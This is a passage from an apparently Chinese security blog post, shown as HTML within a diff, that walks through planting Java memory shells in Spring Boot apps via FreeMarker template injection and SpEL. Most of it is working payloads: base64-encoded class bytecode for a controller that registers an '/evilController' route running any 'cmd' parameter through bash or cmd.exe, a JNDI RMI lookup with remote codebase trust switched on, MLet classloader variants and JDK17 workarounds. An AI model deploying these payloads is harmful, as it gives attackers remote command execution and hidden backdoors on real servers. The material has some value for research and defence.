MamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwoAvQCPBwDFAQANbWVtQ29udHJvbGxlcggAxwEABHRlc3QKAMQAAwoAvQDKDADLAMwBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsHAM4BABNqYXZhL2xhbmcvRXhjZXB0aW9uCgDNANAMANEABgEAD3ByaW50U3RhY2tUcmFjZQEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAjTGNvbS9saW5neDUvbWVtU2hlbGwvbWVtQ29udHJvbGxlcjsBACsoKUxvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvUmVzcG9uc2VFbnRpdHk7AQAHcmVxdWVzdAEAKUxqYWthcnRhL3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAJaXNXaW5kb3dzAQABWgEAB2NoYXJzZXQBABpMamF2YS9uaW8vY2hhcnNldC9DaGFyc2V0OwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEACGNtZEFycmF5AQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAB3Byb2Nlc3MBABNMamF2YS9sYW5nL1Byb2Nlc3M7AQAGc3Rkb3V0AQABZQEAFUxqYXZhL2lvL0lPRXhjZXB0aW9uOwEADVN0YWNrTWFwVGFibGUHAOABAAlTaWduYXR1cmUBAD8oKUxvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvUmVzcG9uc2VFbnRpdHk8TGphdmEvbGFuZy9TdHJpbmc7PjsBAAg8Y2xpbml0PgEABFBBVEgBAAphdHRyaWJ1dGVzAQBCTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9TZXJ2bGV0UmVxdWVzdEF0dHJpYnV0ZXM7AQAIcmVxdWVzdDEBABV3ZWJBcHBsaWNhdGlvbkNvbnRleHQBADdMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9XZWJBcHBsaWNhdGlvbkNvbnRleHQ7AQAHbWFwcGluZwEAVExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvYW5ub3RhdGlvbi9SZXF1ZXN0TWFwcGluZ0hhbmRsZXJNYXBwaW5nOwEAAWYBABlMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQASTGphdmEvbGFuZy9PYmplY3Q7AQAGY29uZmlnAQBUTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8kQnVpbGRlckNvbmZpZ3VyYXRpb247AQAScmVxdWVzdE1hcHBpbmdJbmZvAQA/TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm87AQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAZtZXRob2QBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAApTb3VyY2VGaWxlAQASbWVtQ29udHJvbGxlci5qYXZhAQAMSW5uZXJDbGFzc2VzAQAUQnVpbGRlckNvbmZpZ3VyYXRpb24BAAdCdWlsZGVyACEAxAACAAAAAAADAAEABQAGAAEA0gAAAC8AAQABAAAABSq3AAGxAAAAAgDTAAAABgABAAAAFADUAAAADAABAAAABQDVANYAAAAJAMcA1wACANIAAAF0AAQABwAAAJK4AAfAAA22AA9MEhO4ABWyABu2ACESJ7YAKT0cmQALEi24AC+nAAgSNbgAL04rEje5ADkCADoEBr0AIlkDEj5TWQQSQFNZBRkEUzoFHJkAGAa9ACJZAxJCU1kEEkRTWQUZBFM6BbgARhkFtgBMOga7ACJZGQa2AFC2AFYttwBcS6cADUy7AGFZK7cAY78quABmsAABAAAAgACDAF8AAwDTAAAANgANAAAAGAAKABkAGwAaAC0AGwA3ABwATAAdAFAAHgBlACAAbwAhAIAAJQCDACMAhAAkAI0AJgDUAAAAXAAJAAoAdgDYANkAAQAbAGUA2gDbAAIALQBTANwA3QADADcASQA4AN4ABABMADQA3wDgAAUAbwARAOEA4gAGAIAAAwDjAN4AAACEAAkA5ADlAAEAjQAFAOMA3gAAAOYAAAAqAAX+ACcABwA6AUQHADD+ADgHADAHACIHAOf/AB0AAAABBwBf/AAJBwAiAOgAAAACAOkACADqAAYAAQDSAAAB2AAHAAsAAADdEmxLuAAHwAANTCu2AA9NLLgAbk4tEnQSdrkAeAMAwAB2OgQZBLYAfrYAgrYAghKHtgCJOgUZBQS2AI0ZBRkEtgCTOga7AJdZtwCZOgcZB7sAmlm3AJy2AJ0EvQAiWQMSbFO4AKEEvQCnWQOyAKlTuQCtAgAZB7kAswIAuQC3AQA6CBkGtgB+ErsGvQCDWQMSAlNZBBICU1kFEr1TtgC/OgkZCQS2AMMSxBLGA70Ag7YAvzoKGQkZBga9AAJZAxkIU1kEuwDEWbcAyFNZBRkKU7YAyVenAAhLKrYAz7EAAQAAANQA1wDNAAMA0wAAAFIAFAAAACoAAwAtAAoALgAPAC8AFAAwACMAMQA1ADIAOwAzAEQANABNADUAWQA2AGIANwCCADkAoQA6AKcAOwC0ADwA1ABAANcAPgDYAD8A3ABCANQAAAB6AAwAAwDRAOsA3gAAAAoAygDsAO0AAQAPAMUA7gDZAAIAFADAAO8A8AADACMAsQDxAPIABAA1AJ8A8wD0AAUARACQAIgA9QAGAE0AhwD2APcABwCCAFIA+AD5AAgAoQAzALwA+gAJALQAIAD7APoACgDYAAQA5AD8AAAA5gAAAAkAAvcA1wcAzQQAAgD9AAAAAgD+AP8AAAASAAIAlwCiAQAACQCuAKIBAQYJ&quot;</span>&gt;<br>&lt;#assign decPas=<span class="hljs-string">&quot;T(java.util.Base64).getDecoder()&quot;</span>&gt;<br>&lt;#assign decoder=<span class="hljs-string">&quot;freemarker.template.utility.ObjectConstructor&quot;</span>?<span class="hljs-keyword">new</span>()(<span class="hljs-string">&quot;org.springframework.expression.spel.standard.SpelExpressionParser&quot;</span>).parseExpression(decPas).getValue()&gt;<br>$&#123;decoder&#125;<br>&lt;#assign bytes=decoder.decode(evilBase64)&gt;<br>$&#123;<span class="hljs-string">&quot;freemarker.template.utility.ObjectConstructor&quot;</span>?<span class="hljs-keyword">new</span>()(<span class="hljs-string">&quot;java.io.FileOutputStream&quot;</span>,path).write(bytes)&#125;<br>&lt;#assign pas2=<span class="hljs-string">&quot;&#123;T(java.lang.System).setProperty(\&quot;com.sun.jndi.rmi.object.trustURLCodebase\&quot;, \&quot;true\&quot;),T(java.lang.System).setProperty(\&quot;com.sun.jndi.ldap.object.trustURLCodebase\&quot;, \&quot;true\&quot;),new javax.naming.InitialContext().lookup(\&quot;rmi://localhost:1099/mem\&quot;)&#125;&quot;</span>&gt;<br>$&#123;<span class="hljs-string">&quot;freemarker.template.utility.ObjectConstructor&quot;</span>?<span class="hljs-keyword">new</span>()(<span class="hljs-string">&quot;org.springframework.expression.spel.standard.SpelExpressionParser&quot;</span>).parseExpression(pas2).getValue()&#125;<br></code></pre></td></tr></table></figure>
+
+<p>访问index打入</p>
+<img src="https://gitee.com/ling-x5/img/raw/master/image-20250822194951808.png" srcset="/img/loading.gif" lazyload alt="image-20250822194951808" style="zoom:50%;" />
+
+<p>成功写入</p>
+<img src="https://gitee.com/ling-x5/img/raw/master/image-20250822195012874.png" srcset="/img/loading.gif" lazyload alt="image-20250822195012874" style="zoom:50%;" />
+
+<p>也可以直接使用 Mlet 封装上下文 classloader 来加载类，实现内存马</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">javax</span>.management.loading.MLet(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.net.URL[<span class="hljs-number">0</span>],Thread.currentThread().getContextClassLoader())<br></code></pre></td></tr></table></figure>
+
+<h4 id="SPEL-Mlet-加载-jdk8-16"><a href="#SPEL-Mlet-加载-jdk8-16" class="headerlink" title="SPEL+Mlet 加载 (jdk8-16)"></a>SPEL+Mlet 加载 (jdk8-16)</h4><p>因为 ReflectUtils#defineClass() 方法 本质上调用的就是 Class.ClassLoader.defineClass() 方法，在JDK 9 引入 JPMS（Java Platform Module System）开始，核心类库被“强封装”。<code>java.base</code> 模块默认 <strong>不会把 <code>java.lang</code> 包打开给未命名模块</strong> ，<span style="color:#FF3333; font-size:1.4em;">这个特性，在jdk9-16中只会警告是不安全的，不会拦截，但在jdk17中直接抛异常</span>。绕过具体可以参考 <a target="_blank" rel="noopener" href="https://zer0peach.github.io/2023/12/28/JDK17-%E7%BB%95%E8%BF%87%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6/">JDK17+绕过反射限制 - Zer0peach can’t think</a> </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;#assign pas=<span class="hljs-string">&quot;T(org.springframework.cglib.core.ReflectUtils).defineClass(\&quot;memController\&quot;,new java.util.Base64().getDecoder().decode(\&quot;yv66vgAAAD0BAgoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQAQADKClWCgAIAAkHAAoMAAsADAEAPG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0Q29udGV4dEhvbGRlcgEAGGN1cnJlbnRSZXF1ZXN0QXR0cmlidXRlcwEAPSgpTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0QXR0cmlidXRlczsHAA4BAEBvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L3JlcXVlc3QvU2VydmxldFJlcXVlc3RBdHRyaWJ1dGVzCgANABAMABEAEgEACmdldFJlcXVlc3QBACsoKUxqYWthcnRhL3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7CAAUAQAHb3MubmFtZQoAFgAXBwAYDAAZABoBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwkAHAAdBwAeDAAfACABABBqYXZhL3V0aWwvTG9jYWxlAQAEUk9PVAEAEkxqYXZhL3V0aWwvTG9jYWxlOwoAIgAjBwAkDAAlACYBABBqYXZhL2xhbmcvU3RyaW5nAQALdG9Mb3dlckNhc2UBACYoTGphdmEvdXRpbC9Mb2NhbGU7KUxqYXZhL2xhbmcvU3RyaW5nOwgAKAEAA3dpbgoAIgAqDAArACwBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWggALgEAA0dCSwoAMAAxBwAyDAAzADQBABhqYXZhL25pby9jaGFyc2V0L0NoYXJzZXQBAAdmb3JOYW1lAQAuKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9uaW8vY2hhcnNldC9DaGFyc2V0OwgANgEABVVURi04CAA4AQADY21kCwA6ADsHADwMAD0AGgEAJ2pha2FydGEvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEADGdldFBhcmFtZXRlcggAPwEACS9iaW4vYmFzaAgAQQEAAi1jCABDAQAHY21kLmV4ZQgARQEAAi9jCgBHAEgHAEkMAEoASwEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwoARwBNDABOAE8BAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwoAUQBSBwBTDABUAFUBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsKAFcAWAcAWQwAWgBbAQATamF2YS9pby9JbnB1dFN0cmVhbQEADHJlYWRBbGxCeXRlcwEABCgpW0IKACIAXQwABQBeAQAfKFtCTGphdmEvbmlvL2NoYXJzZXQvQ2hhcnNldDspVgcAYAEAE2phdmEvaW8vSU9FeGNlcHRpb24HAGIBABpqYXZhL2xhbmcvUnVudGltZUV4Y2VwdGlvbgoAYQBkDAAFAGUBABgoTGphdmEvbGFuZy9UaHJvd2FibGU7KVYKAGcAaAcAaQwAagBrAQAnb3JnL3NwcmluZ2ZyYW1ld29yay9odHRwL1Jlc3BvbnNlRW50aXR5AQACb2sBAD0oTGphdmEvbGFuZy9PYmplY3Q7KUxvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvUmVzcG9uc2VFbnRpdHk7CABtAQAPL2V2aWxDb250cm9sbGVyCgBvAHAHAHEMAHIAcwEAO29yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvc3VwcG9ydC9SZXF1ZXN0Q29udGV4dFV0aWxzAQAZZmluZFdlYkFwcGxpY2F0aW9uQ29udGV4dAEAYihMamFrYXJ0YS9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OylMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9XZWJBcHBsaWNhdGlvbkNvbnRleHQ7CAB1AQAccmVxdWVzdE1hcHBpbmdIYW5kbGVyTWFwcGluZwcAdwEAUm9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9hbm5vdGF0aW9uL1JlcXVlc3RNYXBwaW5nSGFuZGxlck1hcHBpbmcLAHkAegcAewwAfAB9AQA1b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9XZWJBcHBsaWNhdGlvbkNvbnRleHQBAAdnZXRCZWFuAQA3KExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvT2JqZWN0OwoAAgB/DACAAIEBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsKAIMAhAcAhQwAhgCBAQAPamF2YS9sYW5nL0NsYXNzAQANZ2V0U3VwZXJjbGFzcwgAiAEAD21hcHBpbmdSZWdpc3RyeQoAgwCKDACLAIwBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7CgCOAI8HAJAMAJEAkgEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQANc2V0QWNjZXNzaWJsZQEABChaKVYKAI4AlAwAlQCWAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsHAJgBAFJvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvJEJ1aWxkZXJDb25maWd1cmF0aW9uCgCXAAMHAJsBADZvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi91dGlsL3BhdHRlcm4vUGF0aFBhdHRlcm5QYXJzZXIKAJoAAwoAlwCeDACfAKABABBzZXRQYXR0ZXJuUGFyc2VyAQA7KExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi91dGlsL3BhdHRlcm4vUGF0aFBhdHRlcm5QYXJzZXI7KVYKAKIAowcApAwApQCmAQA9b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbwEABXBhdGhzAQBcKFtMamF2YS9sYW5nL1N0cmluZzspTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8kQnVpbGRlcjsHAKgBADVvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9iaW5kL2Fubm90YXRpb24vUmVxdWVzdE1ldGhvZAkApwCqDACrAKwBAANHRVQBADdMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvYmluZC9hbm5vdGF0aW9uL1JlcXVlc3RNZXRob2Q7CwCuAK8HALAMALEAsgEARW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8kQnVpbGRlcgEAB21ldGhvZHMBAIEoW0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9iaW5kL2Fubm90YXRpb24vUmVxdWVzdE1ldGhvZDspTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8kQnVpbGRlcjsLAK4AtAwAtQC2AQAHb3B0aW9ucwEAnShMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbyRCdWlsZGVyQ29uZmlndXJhdGlvbjspTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8kQnVpbGRlcjsLAK4AuAwAuQC6AQAFYnVpbGQBAEEoKUxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvOwgAvAEACHJlZ2lzdGVyBwC+AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kCgCDAMAMAMEAwgEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwoAvQCPBwDFAQANbWVtQ29udHJvbGxlcggAxwEABHRlc3QKAMQAAwoAvQDKDADLAMwBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsHAM4BABNqYXZhL2xhbmcvRXhjZXB0aW9uCgDNANAMANEABgEAD3ByaW50U3RhY2tUcmFjZQEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAjTGNvbS9saW5neDUvbWVtU2hlbGwvbWVtQ29udHJvbGxlcjsBACsoKUxvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvUmVzcG9uc2VFbnRpdHk7AQAHcmVxdWVzdAEAKUxqYWthcnRhL3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAJaXNXaW5kb3dzAQABWgEAB2NoYXJzZXQBABpMamF2YS9uaW8vY2hhcnNldC9DaGFyc2V0OwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEACGNtZEFycmF5AQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAB3Byb2Nlc3MBABNMamF2YS9sYW5nL1Byb2Nlc3M7AQAGc3Rkb3V0AQABZQEAFUxqYXZhL2lvL0lPRXhjZXB0aW9uOwEADVN0YWNrTWFwVGFibGUHAOABAAlTaWduYXR1cmUBAD8oKUxvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvUmVzcG9uc2VFbnRpdHk8TGphdmEvbGFuZy9TdHJpbmc7PjsBAAg8Y2xpbml0PgEABFBBVEgBAAphdHRyaWJ1dGVzAQBCTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9TZXJ2bGV0UmVxdWVzdEF0dHJpYnV0ZXM7AQAIcmVxdWVzdDEBABV3ZWJBcHBsaWNhdGlvbkNvbnRleHQBADdMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9XZWJBcHBsaWNhdGlvbkNvbnRleHQ7AQAHbWFwcGluZwEAVExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvYW5ub3RhdGlvbi9SZXF1ZXN0TWFwcGluZ0hhbmRsZXJNYXBwaW5nOwEAAWYBABlMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQASTGphdmEvbGFuZy9PYmplY3Q7AQAGY29uZmlnAQBUTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8kQnVpbGRlckNvbmZpZ3VyYXRpb247AQAScmVxdWVzdE1hcHBpbmdJbmZvAQA/TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm87AQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAZtZXRob2QBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAApTb3VyY2VGaWxlAQASbWVtQ29udHJvbGxlci5qYXZhAQAMSW5uZXJDbGFzc2VzAQAUQnVpbGRlckNvbmZpZ3VyYXRpb24BAAdCdWlsZGVyACEAxAACAAAAAAADAAEABQAGAAEA0gAAAC8AAQABAAAABSq3AAGxAAAAAgDTAAAABgABAAAAFADUAAAADAABAAAABQDVANYAAAAJAMcA1wACANIAAAF0AAQABwAAAJK4AAfAAA22AA9MEhO4ABWyABu2ACESJ7YAKT0cmQALEi24AC+nAAgSNbgAL04rEje5ADkCADoEBr0AIlkDEj5TWQQSQFNZBRkEUzoFHJkAGAa9ACJZAxJCU1kEEkRTWQUZBFM6BbgARhkFtgBMOga7ACJZGQa2AFC2AFYttwBcS6cADUy7AGFZK7cAY78quABmsAABAAAAgACDAF8AAwDTAAAANgANAAAAGAAKABkAGwAaAC0AGwA3ABwATAAdAFAAHgBlACAAbwAhAIAAJQCDACMAhAAkAI0AJgDUAAAAXAAJAAoAdgDYANkAAQAbAGUA2gDbAAIALQBTANwA3QADADcASQA4AN4ABABMADQA3wDgAAUAbwARAOEA4gAGAIAAAwDjAN4AAACEAAkA5ADlAAEAjQAFAOMA3gAAAOYAAAAqAAX+ACcABwA6AUQHADD+ADgHADAHACIHAOf/AB0AAAABBwBf/AAJBwAiAOgAAAACAOkACADqAAYAAQDSAAAB2AAHAAsAAADdEmxLuAAHwAANTCu2AA9NLLgAbk4tEnQSdrkAeAMAwAB2OgQZBLYAfrYAgrYAghKHtgCJOgUZBQS2AI0ZBRkEtgCTOga7AJdZtwCZOgcZB7sAmlm3AJy2AJ0EvQAiWQMSbFO4AKEEvQCnWQOyAKlTuQCtAgAZB7kAswIAuQC3AQA6CBkGtgB+ErsGvQCDWQMSAlNZBBICU1kFEr1TtgC/OgkZCQS2AMMSxBLGA70Ag7YAvzoKGQkZBga9AAJZAxkIU1kEuwDEWbcAyFNZBRkKU7YAyVenAAhLKrYAz7EAAQAAANQA1wDNAAMA0wAAAFIAFAAAACoAAwAtAAoALgAPAC8AFAAwACMAMQA1ADIAOwAzAEQANABNADUAWQA2AGIANwCCADkAoQA6AKcAOwC0ADwA1ABAANcAPgDYAD8A3ABCANQAAAB6AAwAAwDRAOsA3gAAAAoAygDsAO0AAQAPAMUA7gDZAAIAFADAAO8A8AADACMAsQDxAPIABAA1AJ8A8wD0AAUARACQAIgA9QAGAE0AhwD2APcABwCCAFIA+AD5AAgAoQAzALwA+gAJALQAIAD7APoACgDYAAQA5AD8AAAA5gAAAAkAAvcA1wcAzQQAAgD9AAAAAgD+AP8AAAASAAIAlwCiAQAACQCuAKIBAQYJ\&quot;),new javax.management.loading.MLet(java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())))&quot;</span>&gt;<br>$&#123;<span class="hljs-string">&quot;freemarker.template.utility.ObjectConstructor&quot;</span>?<span class="hljs-keyword">new</span>()(<span class="hljs-string">&quot;org.springframework.expression.spel.standard.SpelExpressionParser&quot;</span>).parseExpression(pas).getValue()&#125;<br></code></pre></td></tr></table></figure>
+
+<p>springboot 3 最低支持的版本为 jdk17 直接访问 会报错</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250825144829861.png" srcset="/img/loading.gif" lazyload alt="image-20250825144829861"></p>
+<p>测试加 vm 参数</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">--add-opens java.base/java.lang=ALL-UNNAMED<br>--add-opens java.base/java.util=ALL-UNNAMED<br>--add-opens java.base/java.nio=ALL-UNNAMED<br>--add-opens java.base/sun.nio.ch=ALL-UNNAMED<br></code></pre></td></tr></table></figure>
+
+<img src="https://gitee.com/ling-x5/img/raw/master/image-20250825144432830.png" srcset="/img/loading.gif" lazyload alt="image-20250825144432830" style="zoom:50%;" />
+
+<p>可以正常加载</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250825144551771.png" srcset="/img/loading.gif" lazyload alt="image-20250825144551771"></p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250825144605943.png" srcset="/img/loading.gif" lazyload alt="image-20250825144605943"></p>
+<h4 id="JS引擎加载"><a href="#JS引擎加载" class="headerlink" title="JS引擎加载"></a>JS引擎加载</h4><p>Nashorn 是 Oracle 在 <strong>Java 8</strong> 引入的 JavaScript 引擎，在 <strong>Java 15 被正式移除</strong>，但仍可通过插件或老版本运行时继续使用。</p>
+<table>
+<thead>
+<tr>
+<th>JDK 版本</th>
+<th>内置 JS 引擎</th>
+<th>可用名称 (<code>getEngineByName</code>)</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1.6–1.7</td>
+<td>Rhino</td>
+<td><code>javascript</code>, <code>js</code></td>
+<td>Nashorn 尚未出现</td>
+</tr>
+<tr>
+<td>1.8–1.14</td>
+<td>Nashorn</td>
+<td><code>nashorn</code>, <code>javascript</code>, <code>js</code></td>
+<td>Nashorn 最终取代 Rhino</td>
+</tr>
+<tr>
+<td>15+</td>
+<td>无</td>
+<td>—（返回 <code>null</code>）</td>
+<td>Nashorn 移除，须手动添加引擎</td>
+</tr>
+<tr>
+<td>17+ + GraalJS 依赖</td>
+<td>GraalJS</td>
+<td><code>graal.js</code>, <code>js</code>, <code>javascript</code></td>
+<td>GraalVM 引擎提供多个别名</td>
+</tr>
+<tr>
+<td>17+ + Rhino 依赖</td>
+<td>Rhino</td>
+<td><code>rhino</code>, <code>javascript</code>, <code>js</code></td>
+<td>取决于 Rhino 版本的别名实现</td>
+</tr>
+</tbody></table>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;#assign b64=<span class="hljs-string">&quot;yv66vgAAAD0BAgoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQAQADKClWCgAIAAkHAAoMAAsADAEAPG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0Q29udGV4dEhvbGRlcgEAGGN1cnJlbnRSZXF1ZXN0QXR0cmlidXRlcwEAPSgpTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0QXR0cmlidXRlczsHAA4BAEBvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L3JlcXVlc3QvU2VydmxldFJlcXVlc3RBdHRyaWJ1dGVzCgANABAMABEAEgEACmdldFJlcXVlc3QBACsoKUxqYWthcnRhL3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7CAAUAQAHb3MubmFtZQoAFgAXBwAYDAAZABoBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwkAHAAdBwAeDAAfACABABBqYXZhL3V0aWwvTG9jYWxlAQAEUk9PVAEAEkxqYXZhL3V0aWwvTG9jYWxlOwoAIgAjBwAkDAAlACYBABBqYXZhL2xhbmcvU3RyaW5nAQALdG9Mb3dlckNhc2UBACYoTGphdmEvdXRpbC9Mb2NhbGU7KUxqYXZhL2xhbmcvU3RyaW5nOwgAKAEAA3dpbgoAIgAqDAArACwBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWggALgEAA0dCSwoAMAAxBwAyDAAzADQBABhqYXZhL25pby9jaGFyc2V0L0NoYXJzZXQBAAdmb3JOYW1lAQAuKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9uaW8vY2hhcnNldC9DaGFyc2V0OwgANgEABVVURi04CAA4AQADY21kCwA6ADsHADwMAD0AGgEAJ2pha2FydGEvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEADGdldFBhcmFtZXRlcggAPwEACS9iaW4vYmFzaAgAQQEAAi1jCABDAQAHY21kLmV4ZQgARQEAAi9jCgBHAEgHAEkMAEoASwEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwoARwBNDABOAE8BAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwoAUQBSBwBTDABUAFUBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsKA